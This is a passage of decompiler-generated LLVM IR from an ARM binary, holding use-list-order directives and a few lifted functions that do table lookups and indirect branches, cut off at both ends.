  uselistorder i32 %v2_85dc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8594248, { 1, 0 }
  uselistorder i32 %v5_8590, { 1, 0 }
  uselistorder i8* %v1_8940, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8748, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 34, 12, 33, 13, 35, 14, 17, 15, 18, 16, 36, 32 }
  uselistorder i32 %v2_86d0, { 1, 0 }
  uselistorder i32 %v3_9eb8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-20856.0.ph, { 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 58, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_8500, { 1, 0 }
  uselistorder i32 %v0_8500, { 1, 0 }
  uselistorder i32 %v2_84d0, { 2, 1, 3, 0, 5, 4, 6 }
  uselistorder i32 %v2_84c0, { 1, 0 }
  uselistorder i32 %v8_84a4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8484, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_83b0, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_839c, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_8390, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32 %v1_831c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_830c, { 1, 0 }
  uselistorder i32 %v3_8308, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_8300, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_82f4, { 1, 0, 2 }
  uselistorder i32 %v10_82f0, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82d8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82c8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_82a8, { 1, 0 }
  uselistorder i32 %v0_82a4, { 1, 0, 3, 2 }
  uselistorder i8* %tmp199, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_8280, { 0, 16, 22, 23, 24, 1, 19, 2, 20, 21, 25, 10, 3, 15, 4, 17, 18, 26, 5, 14, 6, 27, 7, 13, 28, 8, 12, 29, 9, 11, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 %v5_8278, { 1, 0 }
  uselistorder i32 %v6_8200, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_81e4, { 2, 1, 0 }
  uselistorder i32 %v1_81d8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20809, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 1, 41, 44, 42, 43 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 13, 11, 12, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 8, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 12, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 153, 150, 151, 152, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 146, 147, 148, 149, 97, 98, 99, 100, 104, 101, 102, 103, 105, 106, 109, 110, 107, 108, 111, 113, 112, 114, 115, 116, 117, 118, 123, 119, 120, 121, 122, 124, 126, 125, 2, 128, 127, 1, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 164, 145, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 98, 99, 100, 65, 66, 67, 68, 69, 72, 73, 70, 71, 74, 75, 76, 77, 78, 79, 80, 82, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 43, 25, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 44, 45, 9, 46, 160, 161, 162, 165, 163, 164, 166, 167, 168, 169, 170, 171, 172, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 61, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 153, 154, 155, 156, 157, 158, 159, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 121, 122, 124, 123, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 151, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 21, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 208, 37, 144, 36, 77, 43, 38, 40, 39, 41, 44, 42, 46, 45, 48, 47, 49, 51, 50, 52, 55, 53, 54, 57, 56, 60, 58, 59, 61, 62, 63, 65, 64, 66, 67, 68, 70, 69, 71, 73, 72, 75, 74, 76, 79, 78, 81, 80, 82, 84, 83, 86, 85, 87, 89, 88, 90, 93, 91, 92, 95, 94, 98, 96, 97, 99, 101, 100, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 112, 113, 114, 16, 116, 115, 118, 117, 119, 121, 120, 122, 123, 328, 330, 329, 332, 331, 333, 13, 334, 335, 12, 336, 11, 337, 10, 9, 14, 338, 339, 340, 342, 341, 343, 345, 344, 347, 346, 124, 125, 126, 128, 127, 129, 131, 130, 133, 132, 135, 134, 136, 138, 137, 139, 140, 142, 141, 19, 143, 146, 145, 148, 147, 150, 149, 153, 151, 152, 155, 154, 156, 158, 157, 159, 161, 160, 163, 162, 165, 164, 166, 168, 167, 169, 171, 170, 172, 173, 175, 174, 177, 176, 178, 180, 179, 181, 183, 182, 184, 185, 187, 186, 189, 188, 190, 192, 191, 193, 195, 194, 196, 198, 197, 199, 200, 202, 201, 204, 203, 211, 205, 206, 275, 207, 209, 210, 20, 212, 213, 18, 214, 215, 216, 217, 218, 219, 220, 222, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 221, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 257, 256, 258, 259, 260, 261, 263, 262, 264, 265, 266, 7, 267, 6, 268, 270, 269, 3, 4, 272, 271, 280, 273, 274, 276, 277, 278, 279, 5, 281, 2, 283, 282, 1, 284, 15, 285, 286, 17, 287, 8, 288, 289, 291, 290, 293, 292, 294, 295, 296, 298, 297, 299, 300, 302, 301, 304, 303, 306, 305, 308, 307, 310, 309, 311, 312, 313, 314, 315, 316, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 54, 55, 56, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 51, 52, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 6, 3, 2, 8, 26, 27, 28, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 139, 140, 97, 99, 98, 100, 101, 102, 107, 109, 108, 103, 104, 105, 106, 110, 111, 112, 113, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 42, 43, 50, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 132, 133, 97, 98, 103, 102, 99, 100, 101, 104, 105, 106, 107, 108, 109, 117, 118, 110, 111, 112, 113, 114, 115, 116, 119, 0, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 42, 43, 50, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 135, 136, 97, 98, 99, 104, 106, 105, 100, 101, 102, 103, 107, 108, 109, 110, 111, 112, 120, 121, 113, 114, 115, 116, 117, 118, 119, 122, 0, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 46, 47, 54, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 66, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 150, 151, 152, 104, 105, 110, 112, 111, 106, 107, 108, 109, 113, 114, 115, 116, 117, 118, 119, 129, 130, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 132, 0, 1, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i32 ptrtoint (i32* @global_var_15f98.51 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f88.46 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f80.44 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_15f7c.42 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15f54.28 to i32), { 0, 2, 1, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e70, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d1c, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %dec_label_pc_9cf0, { 2, 0, 1 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a14, { 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %dec_label_pc_99e8, { 2, 0, 1 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_9884, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_9838, { 1, 0 }
  uselistorder label %dec_label_pc_9810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9804, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_965c, { 1, 0 }
  uselistorder label %dec_label_pc_95ec, { 1, 0 }
  uselistorder label %dec_label_pc_94c0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9400, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_9284, { 1, 0 }
  uselistorder label %dec_label_pc_927c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9254, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_9124, { 2, 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %.thread47, { 3, 0, 1, 2 }
  uselistorder label %bb214, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8d48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8ccc, { 1, 0 }
  uselistorder label %dec_label_pc_8cb4, { 1, 0 }
  uselistorder label %dec_label_pc_8c78, { 1, 0 }
  uselistorder label %dec_label_pc_8c04, { 1, 0 }
  uselistorder label %dec_label_pc_8bcc, { 1, 0 }
  uselistorder label %dec_label_pc_890c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88dc, { 1, 0 }
  uselistorder label %dec_label_pc_8838, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8630, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_855c.dec_label_pc_855c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_853c.dec_label_pc_853c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8528, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8528.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c8, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b8, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f84(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f84:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_9f84 = urem i32 %arg1, 256
  %v2_9f88 = icmp eq i32 %v1_9f84, 0
  %v1_9f90 = urem i32 %arg3, 256
  br i1 %v2_9f88, label %dec_label_pc_9fd4, label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f84
  %v0_9f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_9f9c = add i32 %v0_9f9c, 4
  %v2_9f9c = inttoptr i32 %v1_9f9c to i8*
  %v3_9f9c = load i8, i8* %v2_9f9c, align 1
  %v4_9f9c = zext i8 %v3_9f9c to i32
  %v9_9fa0 = icmp eq i32 %v4_9f9c, %v1_9f90
  br i1 %v9_9fa0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.preheader

dec_label_pc_9fc4.preheader:                      ; preds = %dec_label_pc_9f9c
  br label %dec_label_pc_9fc4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fc4
  %v1_9fb4 = add i32 %v0_9fbc.in, 12
  %v2_9fb4 = inttoptr i32 %v1_9fb4 to i8*
  %v3_9fb4 = load i8, i8* %v2_9fb4, align 1
  %v4_9fb4 = zext i8 %v3_9fb4 to i32
  %v9_9fb8 = icmp eq i32 %v4_9fb4, %v1_9f90
  br i1 %v9_9fb8, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9fc4.preheader, %dec_label_pc_9fb4
  %v0_9fbc.in = phi i32 [ %v0_9f9c, %dec_label_pc_9fc4.preheader ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v0_9fc4 = phi i32 [ 0, %dec_label_pc_9fc4.preheader ], [ %v1_9fc4, %dec_label_pc_9fb4 ]
  %v0_9fbc = add i32 %v0_9fbc.in, 8
  %v1_9fc4 = add i32 %v0_9fc4, 1
  store i32 %v1_9fc4, i32* @lr, align 4
  %v9_9fc8 = icmp eq i32 %v1_9fc4, %v1_9f84
  store i32 %v0_9fbc, i32* %r1.global-to-local, align 4
  br i1 %v9_9fc8, label %dec_label_pc_9fd4, label %dec_label_pc_9fb4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9f84
  ret i32 %arg4

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fb4, %dec_label_pc_9f9c
  %v0_9fdc = phi i32 [ %v0_9f9c, %dec_label_pc_9f9c ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v1_9fdc = inttoptr i32 %v0_9fdc to i32*
  %v2_9fdc = load i32, i32* %v1_9fdc, align 4
  ret i32 %v2_9fdc

; uselistorder directives
  uselistorder i32 %v1_9fc4, { 1, 2, 0 }
  uselistorder i32 %v0_9fbc, { 1, 0, 2 }
  uselistorder i32 %v0_9fbc.in, { 1, 0 }
  uselistorder i32 %v0_9f9c, { 1, 0, 2 }
  uselistorder i32 %v1_9f90, { 1, 0 }
  uselistorder i32 %v1_9f84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fc4, { 1, 0 }
}

define i32 @function_9fe8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9fe8:
  store i32 %arg1, i32* @r6, align 4
  %v1_9ff4 = urem i32 %arg2, 256
  store i32 %v1_9ff4, i32* @r7, align 4
  %v0_a000 = call i32 @function_136c8()
  %v7_a004 = icmp eq i32 %v0_a000, -1
  %tmp23 = icmp slt i32 %v0_a000, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9fe8
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_9fe8
  %. = zext i1 %v7_a004 to i32
  store i32 %., i32* @r5, align 4
  %v2_a01c = icmp eq i1 %v7_a004, false
  br i1 %v2_a01c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  ret i32 %v0_a000

bb26:                                             ; preds = %bb24
  %v0_a024 = call i32 @function_136c8()
  %v7_a028 = icmp eq i32 %v0_a024, -1
  store i32 %v0_a024, i32* @r4, align 4
  br i1 %v7_a028, label %dec_label_pc_a058, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %bb26
  %v2_a034 = icmp eq i32 %v0_a024, 0
  br i1 %v2_a034, label %dec_label_pc_a03c, label %dec_label_pc_a060

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a034
  %v0_a03c = load i32, i32* @r6, align 4
  %v1_a040 = call i32 @function_14ac4(i32 %v0_a03c)
  %v0_a044 = call i32 @function_13720()
  %v2_a04c = call i32 @function_1379c(i32 %v0_a044, i32 9)
  %v0_a050 = load i32, i32* @r4, align 4
  %v1_a054 = call i32 @function_14a30(i32 %v0_a050)
  br label %dec_label_pc_a058

dec_label_pc_a058:                                ; preds = %bb26, %dec_label_pc_a03c
  %v0_a058 = load i32, i32* @r5, align 4
  %v1_a05c = call i32 @function_14a30(i32 %v0_a058)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a034, %dec_label_pc_a058
  %v2_a064 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a064 = zext i8 %v2_a064 to i32
  %v2_a068 = icmp eq i8 %v2_a064, 0
  br i1 %v2_a068, label %dec_label_pc_a0ac, label %dec_label_pc_a070

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060
  %v2_a074 = load i32, i32* @global_var_1ec00.57, align 4
  %v1_a078 = inttoptr i32 %v2_a074 to i32*
  %v2_a078 = load i32, i32* %v1_a078, align 4
  store i32 %v2_a078, i32* @ip, align 4
  %v1_a07c = add i32 %v2_a078, 4
  %v2_a07c = inttoptr i32 %v1_a07c to i8*
  %v3_a07c = load i8, i8* %v2_a07c, align 1
  %v4_a07c = zext i8 %v3_a07c to i32
  %v1_a080 = load i32, i32* @r7, align 4
  %v9_a080 = icmp eq i32 %v4_a07c, %v1_a080
  br i1 %v9_a080, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0.preheader

dec_label_pc_a0a0.preheader:                      ; preds = %dec_label_pc_a070
  %v1_a084 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a0a0

dec_label_pc_a090:                                ; preds = %dec_label_pc_a0a0
  %v4_a090 = mul i32 %v1_a0a0, 4
  %v5_a090 = add i32 %v4_a090, %v2_a074
  %v6_a090 = inttoptr i32 %v5_a090 to i32*
  %v7_a090 = load i32, i32* %v6_a090, align 4
  store i32 %v7_a090, i32* @ip, align 4
  %v1_a094 = add i32 %v7_a090, 4
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v9_a098 = icmp eq i32 %v4_a094, %v1_a080
  br i1 %v9_a098, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0

dec_label_pc_a0a0:                                ; preds = %dec_label_pc_a0a0.preheader, %dec_label_pc_a090
  %v0_a0a0 = phi i32 [ %v1_a084, %dec_label_pc_a0a0.preheader ], [ %v1_a0a0, %dec_label_pc_a090 ]
  %v1_a0a0 = add i32 %v0_a0a0, 1
  %v9_a0a4 = icmp eq i32 %v1_a0a0, %v3_a064
  br i1 %v9_a0a4, label %dec_label_pc_a0ac, label %dec_label_pc_a090

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a0a0, %dec_label_pc_a060, %dec_label_pc_a0b4
  %v1_a0b0 = call i32 @function_14a30(i32 0)
  %v0_a0c8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_a090, %dec_label_pc_a070, %dec_label_pc_a0ac
  %v0_a0c8 = phi i32 [ %v2_a078, %dec_label_pc_a070 ], [ %v0_a0c8.pre, %dec_label_pc_a0ac ], [ %v7_a090, %dec_label_pc_a090 ]
  %v1_a0c8 = inttoptr i32 %v0_a0c8 to i32*
  %v2_a0c8 = load i32, i32* %v1_a0c8, align 4
  call void @__pseudo_branch(i32 %v2_a0c8)
  br label %dec_label_pc_a0ac

; uselistorder directives
  uselistorder i32 %v1_a0a0, { 2, 0, 1 }
  uselistorder i32 %v0_a024, { 1, 2, 0 }
  uselistorder i1 %v7_a004, { 1, 0 }
  uselistorder i32 %v0_a000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0a0, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_a0d8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a0d8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_a0d8 = load i32, i32* @r4, align 4
  %v6_a0d8 = load i32, i32* @r5, align 4
  %v9_a0d8 = load i32, i32* @r6, align 4
  %v12_a0d8 = load i32, i32* @r7, align 4
  %v15_a0d8 = load i32, i32* @r8, align 4
  %v18_a0d8 = load i32, i32* @sb, align 4
  %v21_a0d8 = load i32, i32* @sl, align 4
  %v27_a0d8 = load i32, i32* @lr, align 4
  %v7_a0dc = icmp eq i32 %arg2, 3
  store i1 %v7_a0dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_a0e8 = load i32, i32* %r0.global-to-local, align 4
